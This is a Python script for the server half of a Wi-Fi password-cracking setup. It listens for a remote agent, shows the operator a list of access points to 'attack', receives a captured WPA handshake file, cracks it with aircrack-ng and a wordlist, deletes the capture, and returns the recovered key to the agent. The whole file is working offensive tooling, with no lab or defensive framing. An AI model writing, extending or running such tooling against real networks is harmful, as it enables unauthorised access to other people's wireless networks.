import socket
import os
import subprocess
import tqdm

#TODO: possibly combine retied captures to add missing keys from other incomplete sets

global fileName
fileName = ""

def bToString(arg):
    return ''.join(map(chr, arg))


def breakKey():
    print("Extracting key")
    cracking = subprocess.run(
        ['.\\aircrack-ng-1.6-win\\bin\\aircrack-ng.exe', "-l", "password", "-w", "wordlist.txt", "handshake-01.cap"],
        shell=True, stdout=subprocess.PIPE)
    cracking.stdout = bToString(cracking.stdout)
    if cracking.stdout.__contains__("KEY FOUND"):
        key = open("password").readline()
        print("Key found:", key)
        # delete .cap file
        subprocess.run(["del", "handshake-01.cap"], shell=True)
        # send key back
        return key
    else:
        return None


HOST = "0.0.0.0"  # Standard loopback interface address (localhost)
PORT = 1234  # Port to listen on (non-privileged ports are > 1023)
BUFFER_SIZE = 4096
SEPARATOR = "<SEPARATOR>"

s = socket.socket()
s.bind((HOST, PORT))
s.listen(5)
print(f"[*] Listening as {HOST}:{PORT}")
while True:
    client_socket, client_address = s.accept()
    print(f"[+] {client_address} is connected.")

    receivedHeader = client_socket.recv(BUFFER_SIZE).decode()
    headerCode, headerMessage = receivedHeader.split(SEPARATOR)
    if int(headerCode) == 1:
        headerMessage = headerMessage.split(",")
        i = 0
        j = 0
        while i < len(headerMessage):
            print(f"[{j}] :: {headerMessage[i]} : {headerMessage[i+1]}")
            i += 2
            j += 1
        index = input("select the numeric value for the AP you wish to attack, -1 to rescan: ")
        client_socket.send(bytes(index, 'utf-8'))
        client_socket.close()
    elif int(headerCode) == 2:
        print("Receiving Handshake file")
        received = client_socket.recv(BUFFER_SIZE)
        received = bToString(received)
        filename, filesize = received.split(SEPARATOR)
        filesize = int(filesize)
        print(f"Receiving file {filename} of size {filesize}")
        client_socket.sendall(bytes(f"Ready {filename}", 'utf-8'))
        filename = os.path.basename(filename)
        writeFile = open(filename, "wb")
        count = 0
        while count < filesize:
            # read 1024 bytes from the socket (receive)
            bytes_read = client_socket.recv(BUFFER_SIZE)
            # write new data to file
            writeFile.write(bytes_read)
            # update our byte count
            count += (len(bytes_read))
        print("File received")
        key = breakKey()
        if key is None:
            print("No key extracted")
        else:
            client_socket.sendall(bytes(key, 'utf-8'))
            client_socket.close()
            exit()
